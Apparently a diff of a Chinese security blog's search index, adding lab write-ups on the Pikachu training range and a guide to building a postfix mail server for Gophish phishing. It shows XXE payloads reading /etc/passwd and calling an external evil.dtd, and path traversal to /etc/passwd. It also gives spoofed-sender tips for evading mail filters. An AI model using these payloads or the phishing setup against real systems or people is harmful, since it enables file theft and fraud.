+<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -2189,6 +2189,30 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-目录遍历</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
+<p>很像本地文件包含</p>
+<p>如果是linux系统，可以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>require()也是用于文件包含的函数</p>
+<p>和include()的区别在于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
+
+<p>所以这里当作文件包含利用即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110143442285.png" alt="image-20230110143442285"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-环境部署</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
     <content><![CDATA[<p>linux上可使用宝塔进行部署</p>
@@ -2212,30 +2236,6 @@
 <p><img src="/images/1660097734927-34555e1f-0b21-46b1-a457-0f6ce355a83a.png" alt="img"></p>
 <p><a href="http://127.0.0.1/DX/pikachu/install.php#">http://127.0.0.1/pikachu(自己命名的路径)/install.php</a></p>
 <p><img src="/images/1660097763217-bca63c0b-9f98-4260-9dda-9819b9c8b394.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-目录遍历</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
-    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
-<p>很像本地文件包含</p>
-<p>如果是linux系统，可以访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>require()也是用于文件包含的函数</p>
-<p>和include()的区别在于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
-
-<p>所以这里当作文件包含利用即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110143442285.png" alt="image-20230110143442285"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -2293,6 +2293,106 @@
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>postfix查看日志</title>
+    <url>/2023/05/11/%E7%A4%BE%E5%B7%A5/postfix%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl -u postfix.service</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230323160437589.png" alt="image-20230323160437589"></p>
+<p><img src="/images/image-20230323160449799.png" alt="image-20230323160449799"></p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>邮服搭建和实例(postfix)</title>
+    <url>/2023/05/11/%E7%A4%BE%E5%B7%A5/%E9%82%AE%E6%9C%8D%E6%90%AD%E5%BB%BA%E5%92%8C%E5%AE%9E%E4%BE%8B(postfix)/</url>
+    <content><![CDATA[<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p><a href="https://www.godaddy.com/zh-sg">域名注册购买,云服务器,建站,企业邮箱和网站安全-GoDaddy官方中文站</a></p>
+<p>该站点可以用支付宝支付</p>
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>进去后更改币种为人名币</p>
+<p>除了域名啥都不买</p>
+<p>不一定要.com</p>
+<h2 id="云服务器"><a href="#云服务器" class="headerlink" title="云服务器"></a>云服务器</h2><p>阿贝云暂时不受SMTP 25端口的限制</p>
+<p><a href="https://www.abeiyun.com/">https://www.abeiyun.com/</a></p>
+<p>系统建议使用centos 8.2及以上</p>
+<p><img src="/images/image-20230210154908765.png" alt="image-20230210154908765"></p>
+<h2 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h2><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>可以先配一个泛解析测试下</p>
+<p>添加一条A记录，name写*，值写服务器ip</p>
+<p><img src="/images/1666349582335-e4583d52-a9d2-4f39-b874-4b1b01d6c04b.png"></p>
+<p>服务器开启一个http服务</p>
+<p><img src="/images/1666349641171-2efeb1fa-76df-4eae-86bc-b546d248dd5f.png"></p>
+<p>使用域名访问</p>
+<p><img src="/images/1666349684950-3aa17cec-1342-4048-843a-1ef108aeeb18.png"></p>
+<p>注意，新起的服务器需要关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service //关闭防火墙自启动</span><br></pre></td></tr></table></figure>
+
+<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>DNS中添加两条记录</p>
+<p>一条A记录</p>
+<p><img src="/images/1666349861459-fafebced-e4f8-4301-993a-fb6c9d6f05d9.png"></p>
+<p>一条MX记录</p>
+<p><img src="/images/1666350014537-873ce195-1c8f-402f-9510-a65fd3ab9420.png"></p>
+<p>当发信侧服务器给受信侧发邮件时，首先会要求DNS服务器解析受信侧邮箱地址中@后面部分的域名对应的MX记录（DNS的写法可以理解成example.com 的A记录下面，有一行上面示例的MX记录，当然邮箱服务器也有对应的A记录）。</p>
+<h2 id="邮服搭建"><a href="#邮服搭建" class="headerlink" title="邮服搭建"></a>邮服搭建</h2><p>常见的邮件服务器软件：</p>
+<p>sendmail：性能好，设置复杂，适合老手</p>
+<p>qmail：体积小260+k ，模块化。需要做二次开发，适合对邮件性能有要求的</p>
+<p>postfix：前身是sendmail，postfix原本是sendmail里面的一个模块</p>
+<p>zmailer：近几年才出来的邮件</p>
+<p>coremail：国内做的最好的商业平台，运行在linux上</p>
+<p>这里环境踩了很多坑，建议使用ubuntu 18以上，centos 8.2以上</p>
+<h5 id="本次搭建使用的是"><a href="#本次搭建使用的是" class="headerlink" title="本次搭建使用的是"></a>本次搭建使用的是</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基础环境 </span><br><span class="line"> -centos8.2 x86_64</span><br><span class="line">邮服软件 </span><br><span class="line"> -postfix</span><br><span class="line"> -mailutils</span><br></pre></td></tr></table></figure>
+
+<h5 id="安装postfix"><a href="#安装postfix" class="headerlink" title="安装postfix"></a>安装postfix</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y postfix</span><br></pre></td></tr></table></figure>
+
+<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>相关配置文件在&#x2F;etc&#x2F;postfix下</p>
+<p>首先备份一份配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /etc/postfix/main.cf /etc/postfix/main.cf.bak</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666350724296-7bf6a708-3432-4114-9518-417a3dab9dda.png"></p>
+<p>修改文件内容，可以参考下面内容，逐条修改</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/postfix/main.cf</span><br></pre></td></tr></table></figure>
+
+<p>注意每个字段别有重复，有重复#注释掉就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myhostname = mail.域名</span><br><span class="line">mydomain = 域名</span><br><span class="line">myorigin = $mydomain</span><br><span class="line">inet_interfaces = all</span><br><span class="line">mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain</span><br><span class="line">mynetworks = 127.0.0.0/8</span><br><span class="line">home_mailbox = Maildir/</span><br><span class="line">smtpd_banner = $myhostname ESMTP</span><br></pre></td></tr></table></figure>
+
+<h5 id="启动postfix服务"><a href="#启动postfix服务" class="headerlink" title="启动postfix服务"></a>启动postfix服务</h5><p>启动并开机自启postfix</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart postfix</span><br><span class="line">systemctl enable postfix</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666351194674-a00a901b-4e15-43d1-be1f-0889072d98ed.png"></p>
+<h5 id="安装mailutils"><a href="#安装mailutils" class="headerlink" title="安装mailutils"></a>安装mailutils</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install mailx -y</span><br></pre></td></tr></table></figure>
+
+<h3 id="发送测试邮件"><a href="#发送测试邮件" class="headerlink" title="发送测试邮件"></a>发送测试邮件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Mail Content&quot; | mail -s &quot;Mail Subject&quot; xxx@qq.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666357875177-5b4f5419-32c8-43fa-b66b-703bbd5386e4.png"></p>
+<h5 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h5><p>如果出现异常，可以通过如下命令查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status postfix.service</span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<p><img src="/images/1666356865334-7d51bff6-c66b-467b-bb4e-da3359f66b3b.png"></p>
+<p>出现该问题有可能是被QQ邮箱拦截</p>
+<p>可以设置域名白名单从而进行测试</p>
+<p><img src="/images/1666357723308-3b5459e4-9878-4f63-967a-2c084c516998.png"></p>
+<h2 id="联动gophish"><a href="#联动gophish" class="headerlink" title="联动gophish"></a>联动gophish</h2><p>需要在搭建的邮服上也部署gophish</p>
+<p>gophish的搭建过程在Gophish钓鱼中有写</p>
+<p><a href="https://www.yuque.com/fried_rice/gazfyf/ge7yxd">Gophish钓鱼 · 语雀</a></p>
+<p><img src="/images/1666360801210-ada128af-df4a-46bc-b748-d4a3b6bd7952.png"></p>
+<h5 id="sending-Profiles配置"><a href="#sending-Profiles配置" class="headerlink" title="sending Profiles配置"></a>sending Profiles配置</h5><p>SMTP可以自定义</p>
+<p>Host为127.0.0.1:25</p>
+<p><img src="/images/1666360880306-dfae67ad-8b66-417d-8e9c-39e4e4147dcc.png"></p>
+<p>后面的username和password不用填</p>
+<p>如果SMTP From不是邮服的域名，被拦截的几率会变大，但也可以使用一些不太出名的后缀，比如asdasdfas.com这样</p>
+<h5 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h5><p>参考《Gophish钓鱼》</p>
+<p><a href="https://www.yuque.com/fried_rice/gazfyf/ge7yxd">Gophish钓鱼 · 语雀</a></p>
+<h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><p>这里可以直接用Gophish发送一封测试邮件</p>
+<p><img src="/images/1666362044480-5f2afd89-b604-4a88-93a7-52bb36f97bc8.png"></p>
+<p>可以看到发件人变为我们自定义的</p>
+<p><img src="/images/1666362095958-d116546e-a3da-4b2c-87a7-897ed4f10a69.png"></p>
+<p>注意，可能是我之前用qq邮箱干过啥，不确定的邮件都发不进来，所以这里也需要将admin.com加入白名单域名</p>
+]]></content>
+      <categories>
+        <category>社工</category>
       </categories>
   </entry>
 </search>
